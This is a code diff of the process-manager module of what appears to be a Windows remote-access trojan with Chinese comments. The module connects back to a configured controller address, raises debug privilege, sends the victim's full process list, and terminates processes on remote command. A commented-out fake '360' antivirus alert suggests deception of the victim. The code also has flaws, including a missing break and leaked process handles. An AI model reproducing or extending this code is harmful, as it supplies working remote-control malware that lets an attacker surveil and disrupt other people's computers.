@@ -1,241 +1,174 @@
-#include "stdafx.h"
-#include "Process.h"
-//#include <Psapi.h>
-//#pragma comment(lib,"Psapi.lib")
-#include "psapi.h"
-#include "ConnectInfo.h"
-BOOL RecvKeyInfo();
+#include "Process.H"
+#include "Command.h"
+#include <tlhelp32.h>
+#include <psapi.h>
 
-CProcessEnumerator m_ProcessEnumViewer;
-vector<ProcsInfo> m_ProcsInfo;
-SOCKET ConnSocket;
+bool getPrivilege(const char *PName,BOOL bEnable)
+{
+	BOOL              bResult = TRUE;
+	HANDLE            hToken;
+	TOKEN_PRIVILEGES  TokenPrivileges;
 
-int PEnd;
-CProcessEnumerator::CProcessEnumerator(){
-	m_OSVersion = 0;
-	m_hInstLib = NULL;
-	m_hInstLib2 = NULL;
-
-	m_lpfEnumProcesses = NULL;
-	m_lpfEnumProcessModules = NULL;
-	m_lpfGetModuleFileNameEx = NULL;
-	m_lpfVDMEnumTaskWOWEx = NULL;
-}
-CProcessEnumerator::~CProcessEnumerator(){
-	if (m_hInstLib != NULL)FreeLibrary(m_hInstLib);
-	if (m_hInstLib2 != NULL)FreeLibrary(m_hInstLib2);
-}
-
-BOOL CProcessEnumerator::EnumProcs(char *ProcsInfo){
-	if (m_OSVersion == VER_PLATFORM_WIN32_NT){
-		return EnumWinNTProcs(ProcsInfo);
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
+	{
+		bResult = FALSE;
+		return bResult;
 	}
-	else{
-		return FALSE;
+	TokenPrivileges.PrivilegeCount = 1;
+	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
+
+	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
+	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
+	if (GetLastError() != ERROR_SUCCESS)
+	{
+		bResult = FALSE;
 	}
-	return TRUE;
+
+	CloseHandle(hToken);
+	return bResult;	
 }
 
-BOOL CProcessEnumerator::Initialize(DWORD OSVersion){
-	m_OSVersion = OSVersion;
-	if (m_OSVersion == VER_PLATFORM_WIN32_NT){
-		return InitializeWinNT();
-	}
-	return TRUE;
-}
 
-BOOL CProcessEnumerator::InitializeWinNT(){
-	m_hInstLib = LoadLibraryA("PSAPI.DLL");
-	if (m_hInstLib == NULL)return FALSE;
-	m_hInstLib2 = LoadLibraryA("VDMDBG.DLL");
-	if (m_hInstLib2 == NULL)return FALSE;
-	m_lpfEnumProcesses = (BOOL(WINAPI *)(DWORD *, DWORD, DWORD *))
-		GetProcAddress(m_hInstLib, "EnumProcesses");
-	m_lpfEnumProcessModules = (BOOL(WINAPI *)(HANDLE, HMODULE *,
-		DWORD, LPDWORD))GetProcAddress(m_hInstLib,
-		"EnumProcessModules");
-	m_lpfGetModuleFileNameEx = (DWORD(WINAPI *)(HANDLE, HMODULE,
-		LPTSTR, DWORD))GetProcAddress(m_hInstLib,
-		"GetModuleFileNameExA");
-	m_lpfVDMEnumTaskWOWEx = (INT(WINAPI *)(DWORD, TASKENUMPROCEX,
-		LPARAM))GetProcAddress(m_hInstLib2, "VDMEnumTaskWOOWEx");
-	if (m_lpfEnumProcesses == NULL ||
-		m_lpfEnumProcessModules == NULL ||
-		m_lpfGetModuleFileNameEx == NULL ||
-		m_lpfVDMEnumTaskWOWEx == NULL){
-		return FALSE;
-	}
-	return TRUE;
-}
 
-BOOL CProcessEnumerator::EnumWinNTProcs(char *ProcsInfo){
-	LPDWORD lpdwPIDs;
-	DWORD dwSize, dwSize2, dwIndex, lenInfo=0;
-	HANDLE hProcess;
-	char szFilePath[MAX_PATH];
-	dwSize2 = 256 * sizeof(DWORD);
-	lpdwPIDs = NULL;
-	do{
-		if (lpdwPIDs){
-			HeapFree(GetProcessHeap(), 0, lpdwPIDs);
-			dwSize2 *= 2;
+int bufSize = 0;
+int processCount = 0;
+
+void getProcessList(SOCKET windowManagerSocket, LPMsgHead lpMsgHead){
+	/*bufferSize = 0;
+	windowCount = 0;
+
+	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)lpBuffer);
+	lpMsgHead->dwCmd =  8888;
+	lpMsgHead->dwSize = bufferSize;
+	lpMsgHead->dwExtend1 = windowCount;
+	SendMsg(windowManagerSocket, lpBuffer, lpMsgHead);
+	delete lpBuffer;
+	*/
+	bufSize = 0;
+	processCount = 0;
+	char *lpBuffer = new char [1024 * 200]; 
+	memset(lpBuffer, 0, 1024*200);
+
+	HANDLE			hSnapshot = NULL;
+	HANDLE			hProcess = NULL;
+	HMODULE			hModules = NULL;
+	PROCESSENTRY32	pe32 = {0};
+	DWORD			cbNeeded;
+	char			strProcessName[MAX_PATH] = {0};
+
+	getPrivilege(SE_DEBUG_NAME, TRUE);
+	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if(hSnapshot == INVALID_HANDLE_VALUE)
+		return ;
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+	if(Process32First(hSnapshot, &pe32))
+	{	  
+		do
+		{      
+			
+			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
+			if ((pe32.th32ProcessID !=0 ) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
+			{
+				LPProcessInfo pProcessInfo = new ProcessInfo;
+				memset(pProcessInfo->strTitle, 0, sizeof(pProcessInfo->strTitle));
+				memset(pProcessInfo->strPath, 0, sizeof(pProcessInfo->strPath));
+				pProcessInfo->dwProcessID = 0;
+				EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
+				GetModuleFileNameEx(hProcess, hModules, strProcessName, sizeof(strProcessName));
+				pProcessInfo->dwProcessID = pe32.th32ProcessID; 
+				memcpy(pProcessInfo->strTitle , pe32.szExeFile, lstrlen(pe32.szExeFile));
+				memcpy(pProcessInfo->strPath, strProcessName, lstrlen(strProcessName));
+				memcpy(lpBuffer + bufSize, pProcessInfo, sizeof(ProcessInfo));
+				bufSize += sizeof(ProcessInfo);
+				processCount++;
+				delete pProcessInfo;
+			}
 		}
-		lpdwPIDs = (LPDWORD) HeapAlloc(GetProcessHeap(), 0, dwSize2);
-		if (lpdwPIDs == NULL){
-			return FALSE;
-		}
-		if (!m_lpfEnumProcesses(lpdwPIDs, dwSize2, &dwSize)){
-			HeapFree(GetProcessHeap(), 0, lpdwPIDs);
-			return FALSE;
-		}
-	} while (dwSize == dwSize2);
-	dwSize /= sizeof(DWORD);
-	/*TCHAR tmp[15];
-	wsprintf(tmp, "%d", dwSize);
-	MessageBox(0, tmp, "", MB_OK);*/
-	for (dwIndex = 0; dwIndex < dwSize; dwIndex++){
-		szFilePath[0] = 0;
-		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lpdwPIDs[dwIndex]);
-		if (hProcess != NULL){
-			/*if (m_lpfEnumProcessModules(hProcess, &hMod, sizeof(hMod), &dwSize2)){
-				if (!m_lpfGetModuleFileNameEx(hProcess,
-					hMod, szFilePath, sizeof(szFilePath))){
-					szFilePath[0] = 0;
-				}
-			}*/
-			GetModuleFileNameEx(hProcess, 0, szFilePath, MAX_PATH);
-			CloseHandle(hProcess);
-		}
-		DWORD lastErr = GetLastError();
-		if (strlen(szFilePath) != 0){
-			char szFileName[MAX_PATH];
-			char szFileExt[MAX_PATH];
-			char szPIDs[MAX_PATH];
-			_splitpath(szFilePath, NULL, NULL, szFileName, szFileExt);
-			strcat(szFileName, szFileExt);
-			itoa(lpdwPIDs[dwIndex], szPIDs,10);
-			DWORD lenName = strlen(szFileName);
-			DWORD lenPIDs = strlen(szPIDs);
-			DWORD lenPath = strlen(szFilePath);
-			DWORD x;
-			for (x = 0; x < lenName; x++)ProcsInfo[lenInfo++] = szFileName[x];
-			ProcsInfo[lenInfo++] = ';';
-			for (x = 0; x < lenPIDs; x++)ProcsInfo[lenInfo++] = szPIDs[x];
-			ProcsInfo[lenInfo++] = ';';
-			for (x = 0; x < lenPath; x++)ProcsInfo[lenInfo++] = szFilePath[x];
-			ProcsInfo[lenInfo++] = ';';
-		}
+		while(Process32Next(hSnapshot, &pe32));
 	}
-	ProcsInfo[lenInfo] = 0;
-	HeapFree(GetProcessHeap(), 0, lpdwPIDs);
-	return TRUE;
+	getPrivilege(SE_DEBUG_NAME, FALSE); 
+	CloseHandle(hSnapshot);
+
+	lpMsgHead->dwCmd =  8888;
+	lpMsgHead->dwSize = bufSize;
+	lpMsgHead->dwExtend1 = processCount;
+	SendMsg(windowManagerSocket, lpBuffer, lpMsgHead);
+	delete lpBuffer;
 }
 
-BOOL CheckOSVersion(DWORD &OSVersion){
-	OSVERSIONINFO osver;
-	osver.dwOSVersionInfoSize = sizeof(osver);
-	if (!GetVersionEx(&osver)){
-		return FALSE;
-	}
-	OSVersion = osver.dwPlatformId;
-	if ((OSVersion == VER_PLATFORM_WIN32_NT) ||
-		(OSVersion == VER_PLATFORM_WIN32_WINDOWS)){
-		return TRUE;
-	}
-	return FALSE;
+
+
+void deleteProcess(DWORD id){
+	getPrivilege(SE_SHUTDOWN_NAME,TRUE);
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
+	TerminateProcess(hProcess, 0);
+	CloseHandle(hProcess);
+    getPrivilege(SE_SHUTDOWN_NAME, FALSE);
 }
 
-bool ImprovePrivilege() {
-	HANDLE hToken;
-	bool fOk = false;
-	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_ALL_ACCESS, &hToken)) {
-		TOKEN_PRIVILEGES tp;
-		tp.PrivilegeCount = 1;
-		LookupPrivilegeValue(0, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
-		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-		AdjustTokenPrivileges(hToken, 0, &tp, sizeof(tp), 0, 0);
-		fOk = (GetLastError() == ERROR_SUCCESS);
-		CloseHandle(hToken);
-	}
-	return fOk;
-}
 
-BOOL Endtask(DWORD dwProcessID){
-	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessID);
-	if (hProcess != NULL){
-		DWORD ExitCode;
-		GetExitCodeProcess(hProcess, &ExitCode);
-		if (TerminateProcess(hProcess, ExitCode) == FALSE)return FALSE;
-	}
-	return TRUE;
-}
 
-DWORD __stdcall ProcessdThread(LPVOID lparam){
+void processManager(){
 	struct sockaddr_in LocalAddr;
-	LocalAddr.sin_family = AF_INET;
+	LocalAddr.sin_family=AF_INET;
 	LocalAddr.sin_port = htons(ConnectInfo::getConnectInfo()->port);
-	LocalAddr.sin_addr.S_un.S_addr = inet_addr(ConnectInfo::getConnectInfo()->ipAddress);
-	ConnSocket = socket(AF_INET, SOCK_STREAM, 0);
-	if (connect(ConnSocket, (PSOCKADDR) &LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR){
-		closesocket(ConnSocket);
-		return 0;
+	LocalAddr.sin_addr.S_un.S_addr= inet_addr(ConnectInfo::getConnectInfo()->ipAddress);
+
+	SOCKET processManagerSocket = socket(AF_INET, SOCK_STREAM, 0);//重新建立一个专门的socket和客户端进行交互
+	if(connect(processManagerSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
+	{
+		closesocket(processManagerSocket);
+		return ;//connect error
 	}
 
 	MsgHead msgHead;
-	msgHead.dwCmd = CMD_PROCESS_SHOW;
+	char *chBuffer = new char[1536 * 1024]; //数据交换区 1.5MB
+
+	//send socket type 
+	msgHead.dwCmd = CMD_PROCESS_MANAGER_DLG_SHOW;
 	msgHead.dwSize = 0;
-	if (!SendMsg(ConnSocket, NULL, &msgHead)){
-		closesocket(ConnSocket);
-		return 0;
+	if(!SendMsg(processManagerSocket, chBuffer, &msgHead))
+	{
+		if(chBuffer != NULL)
+			delete []chBuffer;
+
+		closesocket(processManagerSocket);
+		return ;//send socket type error
 	}
-	PEnd = 0;
-	char *chBuffer = new char[25005];
-	chBuffer[0] = 0;
-	DWORD OSVersion = 0;
-	CheckOSVersion(OSVersion);
-	m_ProcessEnumViewer.Initialize(OSVersion);
-	if (!ImprovePrivilege()) {
-		MessageBox(0, "Failed in adjust privilege!", "Runned in admin!", MB_OK);
-	}
-	while (1){
-		if (!RecvMsg(ConnSocket, chBuffer, &msgHead))break;
-		MsgHead MsgSend;
-		switch (msgHead.dwCmd){
-			case CMD_REFRESH:
+	bool flag = true;
+	while(flag)
+	{
+		//接收命令
+		if(!RecvMsg(processManagerSocket, chBuffer, &msgHead))
+			break;
+
+		//解析命令
+		switch(msgHead.dwCmd)
+		{
+		case CMD_SHOW_PROCESS_LIST:
 			{
-				m_ProcessEnumViewer.EnumProcs(chBuffer);
-				MsgSend = msgHead;
-				MsgSend.dwSize = strlen(chBuffer);
-				SendMsg(ConnSocket, chBuffer, &MsgSend);
-				break;
+				getProcessList(processManagerSocket, &msgHead);
 			}
-			case CMD_ENDTASK:
+			break;
+		case CMD_PROCESS_DELETE:
 			{
-				Endtask(msgHead.dwExtend1);
-				m_ProcessEnumViewer.EnumProcs(chBuffer);
-				MsgSend.dwCmd = msgHead.dwCmd;
-				MsgSend.dwSize = strlen(chBuffer);
-				SendMsg(ConnSocket, chBuffer, &MsgSend);
-				break;
+			   
+			deleteProcess(msgHead.dwExtend1);
 			}
+		default:
+			{
+				//::MessageBox(NULL,"您的360出现问题！", "您的360出现问题！", MB_OK);
+			} 
+			break;
+
 		}
+		memset(chBuffer, 0, 1536 * 1024);
 	}
+	if(chBuffer != NULL)
+		delete[] chBuffer;
+	closesocket(processManagerSocket);
+	return ;
 }
 
-DWORD WINAPI ReadConsoleThread(LPVOID lparam){
-	unsigned long BytesRead = 0;
-	int bufsize = 1000;
-	char *pReadBuffer = new char[1024];
-	while (!PEnd){
-		Sleep(100);
-		//while (1){}
-	}
-	return TRUE;
-}
 
-//void Clear(){
-//	closesocket(ConnSocket);
-//	//CloseHandle(m_hReadPipeHandle);
-//	
-//	End = 1;
-//}
+
